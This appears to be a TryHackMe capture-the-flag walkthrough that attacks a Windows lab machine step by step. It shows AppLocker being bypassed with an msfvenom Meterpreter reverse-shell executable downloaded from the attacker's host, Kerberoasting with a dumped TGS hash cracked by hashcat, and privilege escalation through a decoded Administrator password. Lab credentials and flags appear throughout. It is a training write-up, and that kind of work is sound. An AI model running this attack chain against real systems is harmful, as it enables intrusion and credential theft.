# Deploy the Machine
---

In this room, you will learn the following:

1. Windows Forensics
2. Basics of kerberoasting
3. AV Evading
4. Applocker

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. 

Answer the questions below

Deploy the windows machine, you will be able to control this in your browser. However if you prefer to use your own RDP client, the credentials are below.

Username: `corp\dark` 
Password:`_QuejVudId6`


# Bypassing Applocker
---

![](https://i.imgur.com/XtUZMLi.png) 

AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher, and hash.

You will have noticed that with the deployed machine, you cannot execute your binaries, and certain functions on the system will be restricted.

## Practical
---

We need to answer this:

![Pasted image 20250531150543.png](../../IMAGES/Pasted%20image%2020250531150543.png)

We are told we can bypass the `applocker` restriction by dropping a file inside of 

```
 C:/Windows/System32/spool/drivers/color/
```

This directory is in the whitelist by default, so, we can upload a `reverse` shell in the format of an `exe` and execute it to get a reverse shell, let's do it.

>Note: No encoding or complex reverse shell will be created, in real life scenarios, you'd need to craft a more complex payload, make sure to check the Host Evasions module on Tryhackme. If the last step does not work, you'll need to obfuscate and encode the payload.

Knowing all this, we can craft a reverse shell using msfvenom:

``
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.21.28 LPORT=4444 -f exe -o shell.exe
```

Once we got our shell, we need to start our listener and also start a python server to host the file:

```
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; run"
```

We need to connect to RDP, we can use:

```
xfreerdp /u:corp\\dark /p:_QuejVudId6 /v:10.10.253.99 /size:1440x1080 +clipboard +fonts /cert:ignore
```

![Pasted image 20250531151311.png](../../IMAGES/Pasted%20image%2020250531151311.png)

On here, let's host the python server and use Powershell to download the file into the whitelisted path:

```
Invoke-WebRequest -Uri http://10.14.21.28:8000/shell.exe -OutFile C:/Windows/System32/spool/drivers/color/shell.exe
```

![Pasted image 20250531151710.png](../../IMAGES/Pasted%20image%2020250531151710.png)

We can see the request was successful, now, we can execute the file and receive a shell in our listener:

```
C:/Windows/System32/spool/drivers/color/shell.exe
```

Once this goes through, we will receive a shell.

---

Now, for the flag, we can use:

```powershell
Get-Content C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

![Pasted image 20250531152244.png](../../IMAGES/Pasted%20image%2020250531152244.png)

Got our flag:

```
flag{a12a41b5f8111327690f836e9b302f0b}
```



# Kerberoasting
---

![](https://i.imgur.com/9YDvbLg.png)

It is important you understand how Kerberos actually works in order to know how to exploit it. Watch the video below.


Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!


## Practical
---

![Pasted image 20250531152426.png](../../IMAGES/Pasted%20image%2020250531152426.png)

Nice, we need to do the following:

```
setspn -T medin -Q */*
```

![Pasted image 20250531152549.png](../../IMAGES/Pasted%20image%2020250531152549.png)

We now need to download the `Invoke-Kerberoast.ps1` script, for this, download it on our host machine and host it as before:

```
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
```


Once you start the python server, do:
```
Invoke-WebRequest -Uri http://10.14.21.28:8000/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1
```

![Pasted image 20250531152834.png](../../IMAGES/Pasted%20image%2020250531152834.png)

We'll see the request on our server, also, the file is now on our directory we downloaded it:

![Pasted image 20250531152908.png](../../IMAGES/Pasted%20image%2020250531152908.png)

Let's use it:

```
. .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat |fl
```

![Pasted image 20250531153500.png](../../IMAGES/Pasted%20image%2020250531153500.png)

There we go, we got our `TGS`, let's use hashcat to crack it:

```
$krb5tgs$23$*fela$corp.local$HTTP/fela*$3AEADC081F54A76B7337665DBF46B586$F04CE4DA7B0B11A6254A990FB9B2BAAB0045B96BCD02030847BC29BC3A3C5B36812BD31F3355E3CF84CDFA87E53B793583C2EBC5ABAEF273B5DAC288C9823528E7D076C8ADBA2D7DE51D842C88AF0DDD957368B0E7D0E74DC6148F314DC7BAAB8A917342C5EF2AF60E50C1B435BB9F140FBBB14D4436E6198F0046B5B35A0F9AC87A40EAFC919E60878C9E7D79C907B9B59F233DB079DC40A0BE7740B45B281E57B2AD8EEB42C15FD390239EB6D2649396351416E81F1C16A5FA5BF04591501FE3D4B1366899968C6452516FCDFB26AE8120CEBA7C61D1F8E33EC24D3AB292DDEB03E9AD47AD5BC11383D74FEAC269AC9BD47627B812800B2DACD02E97312E4DE452366E8314EFA4260BA87154F4F372E8A5726BE421684CE225382467326BD5452044B88CAE7E6720B23EB7101AAFE7EFB44F990DCE8E65622BF68A9D4566062FC908A5F0F0906D357B724B8614CD1B7A99C2BCAE259340B3B4A3FA929AECB8B8E4611943EDDC89C46F366700B712937D74241BCE639843B148424EA4922885CC8E4CEF578A72DA61C86C607CA5508FFBDF5BB232B6D883E15F4FB9C1C3112D75E3CC8119253B31325C2A083FFE290C378EACDC2529A9C75A8F71B2B31DB4E2F0ED8B93930E7A9498B4059C014FB6425D0F8DD7C5D95A84AD26F6AFDF73BF6441EDC308BAABE11CF42EDED8B773A1DE01B4465714589F7846393D9FDC64B8BC8A52B5640861E506CC6D483CC5ABC507176A2CA45E42A35E1A1B77CABCE5153743D8C23FC2C412D27DA806A36B8E737BEAD26F77FC0471B6F2A17D2A358B1241A684EAB90842F9BDDFDFC9AFD1F3EDDC78B8DFC1C50D628B8C3C772448C574C8A6190ACDD450F6872ADB2F1B2592D58FDB7608C32A0C6EAAD8C8EB48871AEEAA05007C43E1B1BC36A9DC3CFD30A4353ABCBBDC587428026CEF804C505CFDB8344CA3F3DB8494E4A3E52AB90E054FA854CA15ECBB9ABC4FEA734FD4981291DC8C5565F39910F714025260A6BAED9A300D2C40B7855F75D02957FAF058109A20B6FBDB024EF11EBBD5BEAC8A851E7B8269C8E5782C7E9205A59F6B7908DE8B0922AC666379C2E101102B8062F4F218495FF9389C0B629FCA0458CC9FE0CDE5BCBEE889359A68F7F1BC0A56094D8C0127EF25EDD49F81C2B1739D16AC09F90BB90BC01638F68D61C24A18DDDB93613659D2E4F05CD935C48DFD9EBE8D8E7E091F04A4AC2062EDECE40BE4DA46DA1F4CB5E8343D36FD5AEDC5BB495400C901DCF15B3091E8BB66AA1533320F50A3A8B8B5426E781F5ED818780EE75D4688DAEBAD8F6FAE43158F1AC4C971201E4A66437FD7B810A15203C7E00D95CCF2E3107A9DC5A1D2A8548B8010A6B569D61567E8897E839ECEEADDE810EED43A44000337E41C90
```

Save your own `TGS` and crack it with:

```
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

We get this:

```
$krb5tgs$23$*fela$corp.local$HTTP/fela*$3aeadc081f54a76b7337665dbf46b586$f04ce4da7b0b11a6254a990fb9b2baab0045b96bcd02030847bc29bc3a3c5b36812bd31f3355e3cf84cdfa87e53b793583c2ebc5abaef273b5dac288c9823528e7d076c8adba2d7de51d842c88af0ddd957368b0e7d0e74dc6148f314dc7baab8a917342c5ef2af60e50c1b435bb9f140fbbb14d4436e6198f0046b5b35a0f9ac87a40eafc919e60878c9e7d79c907b9b59f233db079dc40a0be7740b45b281e57b2ad8eeb42c15fd390239eb6d2649396351416e81f1c16a5fa5bf04591501fe3d4b1366899968c6452516fcdfb26ae8120ceba7c61d1f8e33ec24d3ab292ddeb03e9ad47ad5bc11383d74feac269ac9bd47627b812800b2dacd02e97312e4de452366e8314efa4260ba87154f4f372e8a5726be421684ce225382467326bd5452044b88cae7e6720b23eb7101aafe7efb44f990dce8e65622bf68a9d4566062fc908a5f0f0906d357b724b8614cd1b7a99c2bcae259340b3b4a3fa929aecb8b8e4611943eddc89c46f366700b712937d74241bce639843b148424ea4922885cc8e4cef578a72da61c86c607ca5508ffbdf5bb232b6d883e15f4fb9c1c3112d75e3cc8119253b31325c2a083ffe290c378eacdc2529a9c75a8f71b2b31db4e2f0ed8b93930e7a9498b4059c014fb6425d0f8dd7c5d95a84ad26f6afdf73bf6441edc308baabe11cf42eded8b773a1de01b4465714589f7846393d9fdc64b8bc8a52b5640861e506cc6d483cc5abc507176a2ca45e42a35e1a1b77cabce5153743d8c23fc2c412d27da806a36b8e737bead26f77fc0471b6f2a17d2a358b1241a684eab90842f9bddfdfc9afd1f3eddc78b8dfc1c50d628b8c3c772448c574c8a6190acdd450f6872adb2f1b2592d58fdb7608c32a0c6eaad8c8eb48871aeeaa05007c43e1b1bc36a9dc3cfd30a4353abcbbdc587428026cef804c505cfdb8344ca3f3db8494e4a3e52ab90e054fa854ca15ecbb9abc4fea734fd4981291dc8c5565f39910f714025260a6baed9a300d2c40b7855f75d02957faf058109a20b6fbdb024ef11ebbd5beac8a851e7b8269c8e5782c7e9205a59f6b7908de8b0922ac666379c2e101102b8062f4f218495ff9389c0b629fca0458cc9fe0cde5bcbee889359a68f7f1bc0a56094d8c0127ef25edd49f81c2b1739d16ac09f90bb90bc01638f68d61c24a18dddb93613659d2e4f05cd935c48dfd9ebe8d8e7e091f04a4ac2062edece40be4da46da1f4cb5e8343d36fd5aedc5bb495400c901dcf15b3091e8bb66aa1533320f50a3a8b8b5426e781f5ed818780ee75d4688daebad8f6fae43158f1ac4c971201e4a66437fd7b810a15203c7e00d95ccf2e3107a9dc5a1d2a8548b8010a6b569d61567e8897e839eceeadde810eed43a44000337e41c90:rubenF124
```

As seen, we got credentials:

```
fela:rubenF124
```

We need to use `rdp` again:

```
xfreerdp /u:corp\\fela /p:"rubenF124" /v:10.10.253.99 /size:1440x1080 +clipboard +auto-reconnect /cert:ignore
```

![Pasted image 20250531154205.png](../../IMAGES/Pasted%20image%2020250531154205.png)

We can see our flag:

![Pasted image 20250531154311.png](../../IMAGES/Pasted%20image%2020250531154311.png)

```
flag{bde1642535aa396d2439d86fe54a36e4}
```

![Pasted image 20250531154304.png](../../IMAGES/Pasted%20image%2020250531154304.png)


# Privilege Escalation
----

![](https://i.imgur.com/pE0VPk4.png) 

We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.


## Practical
----

![Pasted image 20250531160234.png](../../IMAGES/Pasted%20image%2020250531160234.png)

Same procedure as the last task:

```
Invoke-WebRequest -Uri http://10.14.21.28:8000/PowerUp.ps1 -OutFile PowerUp.ps1
.\PowerUp.ps1
```

We can now read `unattended.xml`:


![Pasted image 20250531160740.png](../../IMAGES/Pasted%20image%2020250531160740.png)

We got this hash:

```
dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=
```

Let's decode it:

```
tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;‹ $T 
```

We got it, let's go into rdp and get our flag:

```
xfreerdp /u:Administrator /p:"tqjJpEX9Qv8ybKI3yHcc=L\!5e(\!wW;\$T" /v:10.10.253.99 /size:1440x1080 +clipboard +auto-reconnect /cert:ignore
```

![Pasted image 20250531161032.png](../../IMAGES/Pasted%20image%2020250531161032.png)

We need to change password, change it to anything.

![Pasted image 20250531161948.png](../../IMAGES/Pasted%20image%2020250531161948.png)

Now, we can read our flag:

![Pasted image 20250531162002.png](../../IMAGES/Pasted%20image%2020250531162002.png)

```
THM{g00d_j0b_SYS4DM1n_M4s73R}
```

![Pasted image 20250531162040.png](../../IMAGES/Pasted%20image%2020250531162040.png)

